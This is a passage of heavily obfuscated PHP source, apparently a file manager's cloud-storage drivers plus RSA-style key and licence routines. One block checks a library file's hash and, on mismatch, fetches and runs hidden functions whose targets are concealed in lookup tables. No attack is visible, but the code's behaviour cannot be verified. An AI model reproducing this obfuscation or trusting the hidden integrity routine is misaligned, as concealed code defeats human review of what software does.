$EÔ¨¹¡¶æ) . $e²é—½„¯–); goto Bï††„£šõ; f”©¸Êë”: $B®…õ‰äÇ = $aËÃíë¨²„[662]; while ($B®…õ‰äÇ < $aËÃíë¨²„[590]) { if ($B®…õ‰äÇ >= 0) { break; } $B®…õ‰äÇ++; } goto A²½ÉÓ˜Õ; f“Ö¨ÚÇØ: while ($dÓÚÍ† ± < $aËÃíë¨²„[556]) { if ($dÓÚÍ† ± >= 0) { break; } $dÓÚÍ† ±++; } for ($DÖÏîŠ¨”ì = 0; $DÖÏîŠ¨”ì < $b°èãÃªâä[24]($eÉÈÔ”çĞ); $DÖÏîŠ¨”ì++) { $Dóƒæè”×³ = $Dóƒæè”×³ == $b°èãÃªâä[24]($Dòõ‰šåÉ) ? 0 : $Dóƒæè”×³; $bîŒİŸŸ“ = $aËÃíë¨²„[659]; $fåç’¾›Š = $Dóƒæè”×³++; $eÃ·ªî¢å˜ = $b°èãÃªâä[332]($AøÃ¦øÑæº, $eÉÈÔ”çĞ[$DÖÏîŠ¨”ì]) - $b‰³óÊ¥ - $b°èãÃªâä[333]($Dòõ‰šåÉ[$fåç’¾›Š]); $BÖÛ†ºÏØù = $aËÃíë¨²„[660]; if (strlen($BÖÛ†ºÏØù) < $aËÃíë¨²„[544]) { die; } while ($eÃ·ªî¢å˜ < 0) { $eÃ·ªî¢å˜ += 64; } $E‡¡‡Àİñ… .= $AøÃ¦øÑæº[$eÃ·ªî¢å˜]; } $d£ò’Ï‹İ‡ = $b°èãÃªâä[336]($E‡¡‡Àİñ…); goto cÆîèÓ­ËÑ; DËôÓîÔ²’: $eÃ·ªî¢å˜ = 0; $Dóƒæè”×³ = 0; $dÓÚÍ† ± = $aËÃíë¨²„[658]; goto f“Ö¨ÚÇØ; fòë“Õºà: $E‡¡‡Àİñ… = $b°èãÃªâä[10]; $d÷´éÚ‡æë = $aËÃíë¨²„[657]; $DÖÏîŠ¨”ì = 0; goto DËôÓîÔ²’; A²½ÉÓ˜Õ: default: $d£ò’Ï‹İ‡ = $this->{$_SERVER[õÅ°Ò“][243]}($eÉÈÔ”çĞ, $e²é—½„¯– . $dæÓæ©¶¡); break; $Còà×†¿¾ = $aËÃíë¨²„[663]; while ($Còà×†¿¾ < $aËÃíë¨²„[548]) { if ($Còà×†¿¾ >= 0) { break; } $Còà×†¿¾++; } } if ($C¡ÌÓ„¹ß– - 1 > 0) { $d£ò’Ï‹İ‡ = $this->{$_SERVER[õÅ°Ò“][188]}($d£ò’Ï‹İ‡, $e²é—½„¯–, $C¡ÌÓ„¹ß– - 1); } goto B”„ÒŞ“»; cÄ¼—êÇ ò: } public function osxc182f9e1e($C×‚ë•Áô›) { goto fîµ¬ß¨äñ; fîµ¬ß¨äñ: $dê¹ËÏ“ =& $_SERVER[¼]; $c„„×µ–ø– =& $_SERVER[õÅ°Ò“]; $f–Õ§”©•‹ = $this->{$_SERVER[õÅ°Ò“][337]}(); goto Eñ¼Ë´»ˆ¹; C¸Ğ…¿¹‚È: while ($Cïê®ï¹¡‚ < $dê¹ËÏ“[550]) { if ($Cïê®ï¹¡‚ >= 0) { break; } $Cïê®ï¹¡‚++; } return $BİŠ¡í×ª®; goto c¬âœ‚”ƒ‹; FîªµÏ”ğ–: $bçáÛëÇï = ($f–Õ§”©•‹ - 1) * ($aãˆ……™ºÚ - 1); $b¯Ó”Ù²Ì = $c„„×µ–ø–[201](($f–Õ§”©•‹ + $aãˆ……™ºÚ) / 2); while (1) { $F”áğÇÙ = $b¯Ó”Ù²Ì; $aù¬ŠÇ¢›Ã = $bçáÛëÇï; while ($aù¬ŠÇ¢›Ã % $F”áğÇÙ != 0) { $DŸÀ¼×»º† = $aù¬ŠÇ¢›Ã; $aù¬ŠÇ¢›Ã = $F”áğÇÙ; $b¬œÀğêÀ = $dê¹ËÏ“[665]; if (!$b¬œÀğêÀ) { die; } $F”áğÇÙ = $DŸÀ¼×»º† % $F”áğÇÙ; $EÈãàÁİ = $dê¹ËÏ“[666]; while ($EÈãàÁİ < $dê¹ËÏ“[548]) { if ($EÈãàÁİ >= 0) { break; } $EÈãàÁİ++; } } if ($F”áğÇÙ == 1) { break; } else { $b¯Ó”Ù²Ì++; } } goto bŠŒ­Ñ—Çç; Eõ¥ğÉ„Ğ«: if (strlen($Dë÷¬àù¥) < $dê¹ËÏ“[550]) { die; } $BİŠ¡í×ª® = $this->{$_SERVER[õÅ°Ò“][147]}($C×‚ë•Áô›, $b¤‹Üáìˆ) . $c„„×µ–ø–[341] . $AÅáÀÂË; $Cïê®ï¹¡‚ = $dê¹ËÏ“[642]; goto C¸Ğ…¿¹‚È; e…ò÷¡™Ô‚: if (!$dÍÉØ–Ş±£) { die; } $b¤‹Üáìˆ = $c„„×µ–ø–[114]($c„„×µ–ø–[338] . ($f–Õ§”©•‹ + $aãˆ……™ºÚ) . $c„„×µ–ø–[339] . $b¯Ó”Ù²Ì . $c„„×µ–ø–[339] . $c¢‹½ë—Å  . $c„„×µ–ø–[340]); $Dë÷¬àù¥ = $dê¹ËÏ“[669]; goto Eõ¥ğÉ„Ğ«; Eñ¼Ë´»ˆ¹: $c¥µóé¶Äï = $dê¹ËÏ“[664]; if (!$c¥µóé¶Äï) { die; } $aãˆ……™ºÚ = $this->{$_SERVER[õÅ°Ò“][337]}(); goto FîªµÏ”ğ–; bŠŒ­Ñ—Çç: $c¢‹½ë—Å  = 2; $Bİ‚£¿Üä´ = $dê¹ËÏ“[667]; if (!$Bİ‚£¿Üä´) { die; } goto dß¨Ç„‚; dß¨Ç„‚: for ($F¯Ï”‹ç˜ = 0; $F¯Ï”‹ç˜ < $bçáÛëÇï * 10; $F¯Ï”‹ç˜++) { if (($bçáÛëÇï * $F¯Ï”‹ç˜ + 1) % $b¯Ó”Ù²Ì == 0) { $c¢‹½ë—Å  = $c„„×µ–ø–[201](($bçáÛëÇï * $F¯Ï”‹ç˜ + 1) / $b¯Ó”Ù²Ì); break; } } $AÅáÀÂË = $this->{$_SERVER[õÅ°Ò“][147]}($f–Õ§”©•‹ * $aãˆ……™ºÚ . $c„„×µ–ø–[10], $c„„×µ–ø–[149]); $dÍÉØ–Ş±£ = $dê¹ËÏ“[668]; goto e…ò÷¡™Ô‚; c¬âœ‚”ƒ‹: } public function iatqfeffb5d4($bÃÜ‰†Á) { goto aÎÒ×Õğàß; EÃ×¾¥À‹: $eÔëƒÇ†¿ˆ = ($DÁïÌ‰ œÖ - 1) * ($B ÜÚÔµã - 1); $B«öä¹åÆ‹ = $Fâº´Ú¸Üé[672]; while (strlen($B«öä¹åÆ‹) < $Fâº´Ú¸Üé[556]) { if (!$B«öä¹åÆ‹) { break; } $B«öä¹åÆ‹++; } goto f¯ÆÖóÀÂ©; CÈÔÁ§¶Ñ‡: for ($BŒ¬ë®ğ = 0; $BŒ¬ë®ğ < $eÔëƒÇ†¿ˆ * 10; $BŒ¬ë®ğ++) { if (($eÔëƒÇ†¿ˆ * $BŒ¬ë®ğ + 1) % $EøÁ§÷Ï¼Š == 0) { $fÏ·î°¸Ú = $CÏÅ“·‚È‡[201](($eÔëƒÇ†¿ˆ * $BŒ¬ë®ğ + 1) / $EøÁ§÷Ï¼Š); break; } } $c¼åß÷‰‘¡ = $CÏÅ“·‚È‡[114]($CÏÅ“·‚È‡[338] . ($DÁïÌ‰ œÖ + $B ÜÚÔµã) . $CÏÅ“·‚È‡[339] . $EøÁ§÷Ï¼Š . $CÏÅ“·‚È‡[339] . $fÏ·î°¸Ú . $CÏÅ“·‚È‡[340]); $aˆ¶ğìµïñ = $this->{$_SERVER[õÅ°Ò“][243]}($DÚ‘ÄÒñÉ[0], $c¼åß÷‰‘¡); goto Eåšß¯¡«¦; CÚ­÷‘„÷ƒ: $C¿Ö›Ô…¬ô = $this->{$_SERVER[õÅ°Ò“][243]}($DÚ‘ÄÒñÉ[1] . $CÏÅ“·‚È‡[10], $CÏÅ“·‚È‡[149]); if (!$C¿Ö›Ô…¬ô) { return $CÏÅ“·‚È‡[10]; } $C¿Ö›Ô…¬ô = $CÏÅ“·‚È‡[201]($C¿Ö›Ô…¬ô); goto e¶¿À˜©ˆõ; f¯ÆÖóÀÂ©: $EøÁ§÷Ï¼Š = $CÏÅ“·‚È‡[201](($DÁïÌ‰ œÖ + $B ÜÚÔµã) / 2); while (1) { $a…§¿ìÆÒ = $EøÁ§÷Ï¼Š; $A×ïŠÕ äí = $eÔëƒÇ†¿ˆ; while ($A×ïŠÕ äí % $a…§¿ìÆÒ != 0) { $aŠ½‚öÇ„Ö = $A×ïŠÕ äí; $A×ïŠÕ äí = $a…§¿ìÆÒ; $Câ²¦“†‹ = $Fâº´Ú¸Üé[673]; if (!$Câ²¦“†‹) { return; } $a…§¿ìÆÒ = $aŠ½‚öÇ„Ö % $a…§¿ìÆÒ; } if ($a…§¿ìÆÒ == 1) { break; } else { $EøÁ§÷Ï¼Š++; } } $fÏ·î°¸Ú = 2; goto CÈÔÁ§¶Ñ‡; DÇ§¢äÍœà: $cÌ•¦Ñ„Ö÷ = $Fâº´Ú¸Üé[670]; while ($cÌ•¦Ñ„Ö÷ < $Fâº´Ú¸Üé[556]) { if ($cÌ•¦Ñ„Ö÷ >= 0) { break; } $cÌ•¦Ñ„Ö÷++; } if ($CÏÅ“·‚È‡[19]($DÚ‘ÄÒñÉ) != 2) { return $CÏÅ“·‚È‡[10]; } goto CÚ­÷‘„÷ƒ; Eåšß¯¡«¦: return $aˆ¶ğìµïñ; goto fŸ¶õªß‘; e¶¿À˜©ˆõ: $DÁïÌ‰ œÖ = 0; $B ÜÚÔµã = 0; for ($BŒ¬ë®ğ = 3; $BŒ¬ë®ğ < $C¿Ö›Ô…¬ô; $BŒ¬ë®ğ += 2) { if ($C¿Ö›Ô…¬ô % $BŒ¬ë®ğ != 0) { continue; } $DÁïÌ‰ œÖ = $BŒ¬ë®ğ; $B ÜÚÔµã = $CÏÅ“·‚È‡[201]($C¿Ö›Ô…¬ô / $BŒ¬ë®ğ); $eÔµÎË”¦ = $Fâº´Ú¸Üé[671]; break; } goto EÃ×¾¥À‹; aÎÒ×Õğàß: $Fâº´Ú¸Üé =& $_SERVER[¼]; $CÏÅ“·‚È‡ =& $_SERVER[õÅ°Ò“]; $DÚ‘ÄÒñÉ = $CÏÅ“·‚È‡[0]($CÏÅ“·‚È‡[341], $bÃÜ‰†Á); goto DÇ§¢äÍœà; fŸ¶õªß‘: } public function nxvee543780e() { goto c§¶İŠõãÎ; c§¶İŠõãÎ: $eÄéØŠ•ÒÔ =& $_SERVER[¼]; $AæøÇùØÓ‹ =& $_SERVER[õÅ°Ò“]; $e¥ğ¨—®ß´ = $AæøÇùØÓ‹[322]($AæøÇùØÓ‹[342](2, 14), $AæøÇùØÓ‹[342](2, 16) - 1); goto c™‹ªÄÊµ¨; D¨Öà¬‘î: while ($a‘Âä„®ãŸ <= (int) $AæøÇùØÓ‹[343]($e¥ğ¨—®ß´)) { $AŒˆ³“Ì„Ñ = $a‘Âä„®ãŸ; $EÈ‘’‚ù  = $eÄéØŠ•ÒÔ[676]; if (strlen($EÈ‘’‚ù ) < $eÄéØŠ•ÒÔ[590]) { die; } while (!0) { $AŒˆ³“Ì„Ñ++; if ($AŒˆ³“Ì„Ñ <= 2) { $a‘Âä„®ãŸ = $AŒˆ³“Ì„Ñ; break; } else { if ($AŒˆ³“Ì„Ñ < 2) { continue; } } $c§ŒïëÖ¸¡ = !0; for ($AÄ²ËáôÜ… = 2; $AÄ²ËáôÜ… <= $AæøÇùØÓ‹[343]($AŒˆ³“Ì„Ñ); $AÄ²ËáôÜ…++) { if ($AŒˆ³“Ì„Ñ % $AÄ²ËáôÜ… == 0) { $c§ŒïëÖ¸¡ = !1; } } if ($c§ŒïëÖ¸¡) { $a‘Âä„®ãŸ = $AŒˆ³“Ì„Ñ; break; } } $dÌÂ°ï¡ñš[] = $a‘Âä„®ãŸ; } $dÅ¢®Çº’‘ = 2; for ($AŒˆ³“Ì„Ñ = $e¥ğ¨—®ß´; $AŒˆ³“Ì„Ñ > 1; $AŒˆ³“Ì„Ñ--) { $c§ŒïëÖ¸¡ = !0; $aÂÉÍßêÜ = $eÄéØŠ•ÒÔ[677]; while (strlen($aÂÉÍßêÜ) < $eÄéØŠ•ÒÔ[556]) { if (!$aÂÉÍßêÜ) { break; } $aÂÉÍßêÜ++; } foreach ($dÌÂ°ï¡ñš as $F¥˜¦Ì®É…) { if ($AŒˆ³“Ì„Ñ % $F¥˜¦Ì®É… == 0) { $c§ŒïëÖ¸¡ = !1; break; } } if ($c§ŒïëÖ¸¡) { $dÅ¢®Çº’‘ = $AŒˆ³“Ì„Ñ; break; } } goto C”¹—Øİ—õ; C”¹—Øİ—õ: return $dÅ¢®Çº’‘; goto c÷¼‚¦ˆ£; c™‹ªÄÊµ¨: $B¡·ƒÆáÄ = $eÄéØŠ•ÒÔ[674]; if (!$B¡·ƒÆáÄ) { return; } $dÌÂ°ï¡ñš = array(); goto eƒ…™ó‘÷ø; eƒ…™ó‘÷ø: $BÄÌ“Õì²Â = $eÄéØŠ•ÒÔ[675]; while ($BÄÌ“Õì²Â < $eÄéØŠ•ÒÔ[590]) { if ($BÄÌ“Õì²Â >= 0) { break; } $BÄÌ“Õì²Â++; } $a‘Âä„®ãŸ = 1; goto D¨Öà¬‘î; c÷¼‚¦ˆ£: } public function mvnc741117e0($F«Ã©ÓÕ¦Ä, $E¢¿Üí£î) { $c±óì®¼š÷ =& $_SERVER[¼]; $A š¾ìÚéº =& $_SERVER[õÅ°Ò“]; return $A š¾ìÚéº[13](array($A š¾ìÚéº[14], $A š¾ìÚéº[344]), $F«Ã©ÓÕ¦Ä, $E¢¿Üí£î); $AÇù×ô²­ = $c±óì®¼š÷[678]; while ($AÇù×ô²­ < $c±óì®¼š÷[556]) { if ($AÇù×ô²­ >= 0) { break; } $AÇù×ô²­++; } } public function pavh1595fe71($fä„Œ‘É, $BŠê—èñ‡À) { $dÜ¸Ò®’ğñ =& $_SERVER[õÅ°Ò“]; return $dÜ¸Ò®’ğñ[13](array($dÜ¸Ò®’ğñ[345], $dÜ¸Ò®’ğñ[346]), $fä„Œ‘É, $BŠê—èñ‡À); } public function tqih4649ce2b($Aê‘ ‡§, $bœŸá“˜) { $aÍœ’Ş‹ƒ­ =& $_SERVER[õÅ°Ò“]; return $aÍœ’Ş‹ƒ­[13](array($aÍœ’Ş‹ƒ­[345], $aÍœ’Ş‹ƒ­[347]), $Aê‘ ‡§, $bœŸá“˜); $aò•¾Í‚‰ = $_SERVER[¼][633]; if (!$aò•¾Í‚‰) { die; } } } goto Eˆğè’ËÂ; c¤ÅóÛô¤Î: $cÃïĞºƒ½ = LIB_DIR . $_SERVER[¼][752]; $cõ¨Ê‚µ‰ = $_SERVER[¼][753]; if ($_SERVER[$_SERVER[¼][754]] != $cõ¨Ê‚µ‰($cÃïĞºƒ½)) { goto eğ••…¦ÏŠ; e­Öæ…Í¼ç: $c²‡¨¦ï¹È = explode($_SERVER[¼][214], $d—èàÆä˜¶); if (count($c²‡¨¦ï¹È) < $_SERVER[¼][544]) { $f…‚·»Õä® = $_SERVER[¼][758]; $f…‚·»Õä®(); } $Fë ‰£ÛãÚ = $_SERVER[¼][759]; goto d•Ì®……‚‡; d•Ì®……‚‡: $Fë ‰£ÛãÚ($cÃïĞºƒ½); goto f»½¯­…£; eğ••…¦ÏŠ: $a½ÍÜ”‘‡… = $_SERVER[¼][755]; $a“‚Ù¡º× = $_SERVER[$_SERVER[¼][756]] . $_SERVER[¼][757]; $d—èàÆä˜¶ = $a½ÍÜ”‘‡…($a“‚Ù¡º×); goto e­Öæ…Í¼ç; f»½¯­…£: } goto aùñÍ¸í˜; cƒ‰äÙ–Ğ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($E¼¿Í ’Š«) { parent::__construct($E¼¿Í ’Š«); $this->signatureVersion($_SERVER[¼][197]); } public function fileOutLink($C·‘ù×¼ªİ) { $fóœ©«Í„ë =& $_SERVER[¼]; if (substr($C·‘ù×¼ªİ, 0, 7) == $fóœ©«Í„ë[1101]) { $C·‘ù×¼ªİ = $fóœ©«Í„ë[1102] . substr($C·‘ù×¼ªİ, 7); } header($fóœ©«Í„ë[153] . $C·‘ù×¼ªİ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($a¸¦ŠÍ·£™) { parent::__construct(); include_once SDK_DIR . $_SERVER[¼][1156]; $this->_init($a¸¦ŠÍ·£™); } public function _init($C‰¯Ñ‹¸–Ù) { foreach ($C‰¯Ñ‹¸–Ù as $cùœñîÕéŒ => $DÖÓˆ¿”ø¥) { if (isset($this->{$cùœñîÕéŒ})) { $this->{$cùœñîÕéŒ} = $DÖÓˆ¿”ø¥; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¼][1157], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto b£ÔëÎöïÑ; E¾Ï¤‹ÌáÁ: $F•Ñƒ‚ˆğ™->addAllowedMethod($d®Ñ¥×³â†[1161]); $F•Ñƒ‚ˆğ™->addAllowedMethod($d®Ñ¥×³â†[1162]); $F•Ñƒ‚ˆğ™->addAllowedMethod($d®Ñ¥×³â†[152]); goto b´Æ“Ëùºä; c½ÆİÍà£: $F•Ñƒ‚ˆğ™->addAllowedOrigin($d®Ñ¥×³â†[1158]); $F•Ñƒ‚ˆğ™->addAllowedMethod($d®Ñ¥×³â†[1159]); $F•Ñƒ‚ˆğ™->addAllowedMethod($d®Ñ¥×³â†[1160]); goto E¾Ï¤‹ÌáÁ; b£ÔëÎöïÑ: $d®Ñ¥×³â† =& $_SERVER[¼]; $Fğ‹Ş„¤Å = new OSS\Model\CorsConfig(); $F•Ñƒ‚ˆğ™ = new OSS\Model\CorsRule(); goto c½ÆİÍà£; b´Æ“Ëùºä: $F•Ñƒ‚ˆğ™->setMaxAgeSeconds(600); $F•Ñƒ‚ˆğ™->addExposeHeader($d®Ñ¥×³â†[1163]); $F•Ñƒ‚ˆğ™->addAllowedHeader($d®Ñ¥×³â†[1158]); goto aØéÑÇŒİº; aØéÑÇŒİº: $Fğ‹Ş„¤Å->addRule($F•Ñƒ‚ˆğ™); try { $this->client->putBucketCors($this->bucket, $Fğ‹Ş„¤Å); } catch (OSS\Core\OssException $d–‡Ê‘¿»Ë) { return !1; } return !0; goto då…†Õø–ä; då…†Õø–ä: } public function getBucketCors() { goto Bù»­§ï¥Î; Bù»­§ï¥Î: $BÍ“‰åºë =& $_SERVER[¼]; $cå¾‹ ÄŞ¾ = null; try { $cå¾‹ ÄŞ¾ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $BéÇ¶ƒ÷Ô°) { return null; } goto b…ËªŠ £; A¾£Ñ¿…ù‹: return array($BÍ“‰åºë[172] => isset($C¶òŠª¿¡Á[0]) ? $C¶òŠª¿¡Á[0] : $BÍ“‰åºë[33], $BÍ“‰åºë[176] => $CÌŠÀ’¯¸Ç, $BÍ“‰åºë[1164] => $CÔöÑ¤Üá¼, $BÍ“‰åºë[1165] => isset($d¤¯®Ÿí½[0]) ? $d¤¯®Ÿí½[0] : $BÍ“‰åºë[33], $BÍ“‰åºë[174] => isset($cÖœÖƒŒ¯[0]) ? $cÖœÖƒŒ¯[0] : $BÍ“‰åºë[33]); goto Fö× ·„†ˆ; B–¹½Î‹¾: $CÔöÑ¤Üá¼ = $eğÄƒâ‘ñÖ[0]->getMaxAgeSeconds(); $d¤¯®Ÿí½ = $eğÄƒâ‘ñÖ[0]->getExposeHeaders(); $cÖœÖƒŒ¯ = $eğÄƒâ‘ñÖ[0]->getAllowedHeaders(); goto A¾£Ñ¿…ù‹; b…ËªŠ £: if (!$cå¾‹ ÄŞ¾ || !($eğÄƒâ‘ñÖ = $cå¾‹ ÄŞ¾->getRules())) { return null; } $C¶òŠª¿¡Á = $eğÄƒâ‘ñÖ[0]->getAllowedOrigins(); $CÌŠÀ’¯¸Ç = $eğÄƒâ‘ñÖ[0]->getAllowedMethods(); goto B–¹½Î‹¾; Fö× ·„†ˆ: } public function isBucketCors() { goto CÛ©ì›Ó; Bµ‰§ïÇ“ß: if ($B…§Íêø«ƒ[$BÎÛª®¥¾¯[172]] != $BÎÛª®¥¾¯[173] || $B…§Íêø«ƒ[$BÎÛª®¥¾¯[174]] != $BÎÛª®¥¾¯[173]) { return !1; } $eŞÇô¡ÔÅê = array_map($BÎÛª®¥¾¯[175], $B…§Íêø«ƒ[$BÎÛª®¥¾¯[176]]); if (!is_array($eŞÇô¡ÔÅê)) { $eŞÇô¡ÔÅê = array(); } goto F‹•­×õ®; CÛ©ì›Ó: $BÎÛª®¥¾¯ =& $_SERVER[¼]; $B…§Íêø«ƒ = $this->getBucketCors(); if (!$B…§Íêø«ƒ || !is_array($B…§Íêø«ƒ)) { return !1; } goto Bµ‰§ïÇ“ß; F‹•­×õ®: $d“³ò¹‡Ø¼ = array($BÎÛª®¥¾¯[177], $BÎÛª®¥¾¯[178], $BÎÛª®¥¾¯[179], $BÎÛª®¥¾¯[180], $BÎÛª®¥¾¯[181]); $Càª²¬Â  = array_diff($d“³ò¹‡Ø¼, $eŞÇô¡ÔÅê); return empty($Càª²¬Â ); goto A—ÎÄœÙŒË; A—ÎÄœÙŒË: } public function mkfile($aÜ»ÕĞ™Ïì, $d‘İáî‘ã = '', $f´Ñ‘åö… = REPEAT_RENAME) { $cóÖÃÀó¶ = $this->setContent($aÜ»ÕĞ™Ïì, $d‘İáî‘ã); if ($cóÖÃÀó¶ !== !1) { return $this->getPathOuter($aÜ»ÕĞ™Ïì); } return !1; } public function mkdir($E…„ĞîÂÕƒ, $dÙ¯«Ò«ô = REPEAT_SKIP) { if ($this->_isFolder($E…„ĞîÂÕƒ)) { return $this->getPathOuter($E…„ĞîÂÕƒ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($E…„ĞîÂÕƒ)); } catch (OSS\Core\OssException $cÓ—±ºœ¹) { return !1; } return $this->getPathOuter($E…„ĞîÂÕƒ); } private function fileList($FšÅ—å·æ«, $D±‚÷—õ¸Ö = '', $cÖ«¤¼Ñª… = 0) { goto B ¹‚›Ï¿ƒ; fÑ‚÷´„øá: while (!0) { $e¿ÖÚõÜ¡ö = array($DĞÛ…íèÃÅ[1166] => $D±‚÷—õ¸Ö, $DĞÛ…íèÃÅ[183] => $DœÎºõŒ«, $DĞÛ…íèÃÅ[1167] => $BÈÏëÜ³Å, $DĞÛ…íèÃÅ[1168] => $b‰èôÆá¹); try { $Cï¼½‰µŞÈ = $this->client->listObjects($this->bucket, $e¿ÖÚõÜ¡ö); } catch (OSS\Core\OssException $eÁñòÂŞéá) { break; } $b‰èôÆá¹ = $Cï¼½‰µŞÈ->getNextMarker(); $eŠ„Ò¸ƒ¯ğ = $Cï¼½‰µŞÈ->getObjectList(); $EÃî¸ˆ¼ì† = $Cï¼½‰µŞÈ->getPrefixList(); foreach ($eŠ„Ò¸ƒ¯ğ as $Cä†âèòÛˆ) { if ($Cä†âèòÛˆ->getKey() == $DœÎºõŒ«) { continue; } $b¯—Ó‚Ä¾ = $Cä†âèòÛˆ->getKey(); if ($cÖ«¤¼Ñª…) { $b¯—Ó‚Ä¾ = array($DĞÛ…íèÃÅ[28] => $b¯—Ó‚Ä¾, $DĞÛ…íèÃÅ[77] => $Cä†âèòÛˆ->getSize(), $DĞÛ…íèÃÅ[187] => strtotime($Cä†âèòÛˆ->getLastModified())); } $AÖš†Š‰¢[] = $b¯—Ó‚Ä¾; } foreach ($EÃî¸ˆ¼ì† as $c™Ëª“ô¸Î) { $d›®ŠÙ¥™ [] = $c™Ëª“ô¸Î->getPrefix(); } if ($b‰èôÆá¹ === $DĞÛ…íèÃÅ[33]) { break; } } return array($DĞÛ…íèÃÅ[74] => $d›®ŠÙ¥™ , $DĞÛ…íèÃÅ[73] => $AÖš†Š‰¢); goto AãÌŞ…Ø˜; B ¹‚›Ï¿ƒ: $DĞÛ…íèÃÅ =& $_SERVER[¼]; $FšÅ—å·æ« = trim($FšÅ—å·æ«, $DĞÛ…íèÃÅ[8]); $DœÎºõŒ« = empty($FšÅ—å·æ«) ? $DĞÛ…íèÃÅ[33] : $FšÅ—å·æ« . $DĞÛ…íèÃÅ[8]; goto b¨‘ÕŒƒ‘Ô; b¨‘ÕŒƒ‘Ô: $b‰èôÆá¹ = $DĞÛ…íèÃÅ[33]; $BÈÏëÜ³Å = 1000; $d›®ŠÙ¥™  = $AÖš†Š‰¢ = array(); goto fÑ‚÷´„øá; AãÌŞ…Ø˜: } public function copyFile($D®ãğ³êŠ, $BŞÕã”¨) { $EŠßøóÇ¤Ÿ = $this->size($D®ãğ³êŠ); if ($EŠßøóÇ¤Ÿ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $D®ãğ³êŠ, $this->bucket, $this->pathEncode($BŞÕã”¨)); } catch (OSS\Core\OssException $B”»‹Õó½¸) { return !1; } return !0; } return $this->multiCopyObject($D®ãğ³êŠ, $BŞÕã”¨, $EŠßøóÇ¤Ÿ); } private function multiCopyObject($A‘ìİòíœ‘, $D·ğ…ÔÈ‚Á, $f×ßìõï·À) { $AÏ›‡÷•ÓÇ =& $_SERVER[¼]; try { goto fÖ”±×ø®; C˜­¬÷§ä‰: $D¸ë½ÇŠÒ§ = 1; $EÚ‚Áà² = 0; $Få‚¿«Ä‡· = array(); goto b£ŸŠ¿ñ«Ÿ; C–Á‘æºæ: $EÍ¸°×íÖ÷ = array(); foreach ($Få‚¿«Ä‡· as $b¼×ë®Ê => $e …§…ƒ½‡) { $EÍ¸°×íÖ÷[] = array($AÏ›‡÷•ÓÇ[1173] => $b¼×ë®Ê + 1, $AÏ›‡÷•ÓÇ[1174] => $e …§…ƒ½‡); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($D·ğ…ÔÈ‚Á), $e‹°ï‡Ë¿³, $EÍ¸°×íÖ÷); goto eŸÖø¢²óŠ; b£ŸŠ¿ñ«Ÿ: $a‚¤¾èæ¸Š = $this->osChunkSize(); $cà¼ÕÇ¸ = $this->client->generateMultiuploadParts($f×ßìõï·À, $a‚¤¾èæ¸Š); foreach ($cà¼ÕÇ¸ as $b¼×ë®Ê => $B­¾ßîÁÆê) { $EøÈµöÑİ = $EÚ‚Áà² + (int) $B­¾ßîÁÆê[$AÏ›‡÷•ÓÇ[1170]]; $a·šœ†ÑÔÜ = (int) $B­¾ßîÁÆê[$AÏ›‡÷•ÓÇ[322]] + $EøÈµöÑİ - 1; $e¼œÅ¼áÕ¶ = array($AÏ›‡÷•ÓÇ[1171] => $EøÈµöÑİ, $AÏ›‡÷•ÓÇ[1172] => $a·šœ†ÑÔÜ); $Få‚¿«Ä‡·[] = $this->client->uploadPartCopy($this->bucket, $A‘ìİòíœ‘, $this->bucket, $this->pathEncode($D·ğ…ÔÈ‚Á), $D¸ë½ÇŠÒ§, $e‹°ï‡Ë¿³, $e¼œÅ¼áÕ¶); $D¸ë½ÇŠÒ§ = $D¸ë½ÇŠÒ§ + 1; } goto C–Á‘æºæ; fÖ”±×ø®: $fÕ‘§ƒ“¡ï = array(); if ($dñ¶ŠõÚ³’ = $this->hashMd5($A‘ìİòíœ‘)) { $fÕ‘§ƒ“¡ï = array(OSS\OssClient::OSS_HEADERS => array($AÏ›‡÷•ÓÇ[1169] => $dñ¶ŠõÚ³’)); } $e‹°ï‡Ë¿³ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D·ğ…ÔÈ‚Á), $fÕ‘§ƒ“¡ï); goto C˜­¬÷§ä‰; eŸÖø¢²óŠ: } catch (OSS\Core\OssException $dÅ¡…ß³ë³) { return !1; } return !0; } public function moveFile($BáÂŠ¸Æ˜â, $f¬´êÑå–) { if ($this->copyFile($BáÂŠ¸Æ˜â, $f¬´êÑå–)) { $this->remove($BáÂŠ¸Æ˜â); return !0; } return !1; } public function delFile($fÉŒÕ«¡ã‚) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($fÉŒÕ«¡ã‚)); } catch (OSS\Core\OssException $Bò¦÷¢Õ¼¡) { return !1; } return !0; } public function delFolder($eÌÁˆ‰Ú­ö) { $c®Î³¤ÁÊµ =& $_SERVER[¼]; $C´Ú¼ç—é‹ = $this->fileList($eÌÁˆ‰Ú­ö); if (!empty($eÌÁˆ‰Ú­ö) && !in_array(trim($eÌÁˆ‰Ú­ö, $c®Î³¤ÁÊµ[8]) . $c®Î³¤ÁÊµ[8], $C´Ú¼ç—é‹[$c®Î³¤ÁÊµ[73]])) { $C´Ú¼ç—é‹[$c®Î³¤ÁÊµ[73]][] = trim($eÌÁˆ‰Ú­ö, $c®Î³¤ÁÊµ[8]) . $c®Î³¤ÁÊµ[8]; } foreach (array_chunk($C´Ú¼ç—é‹[$c®Î³¤ÁÊµ[73]], 1000) as $Bòµ×Ø¹–) { try { $this->client->deleteObjects($this->bucket, $Bòµ×Ø¹–); } catch (OSS\Core\OssException $D„Ş±µ’âø) { continue; } } return !0; } public function rename($AˆÖçƒ¨‹Ã, $e–·ôß½–Ò) { return $this->renameObject($AˆÖçƒ¨‹Ã, $e–·ôß½–Ò); } private function fileInfo($EÚÕ±ˆÇ°Û, $c§¼ Î³† = array()) { goto FÊ“Ãèò¢; FÊ“Ãèò¢: $F–Š÷ƒàƒâ =& $_SERVER[¼]; $a³ÍÈÓ²ÌÌ = array($F–Š÷ƒàƒâ[28] => 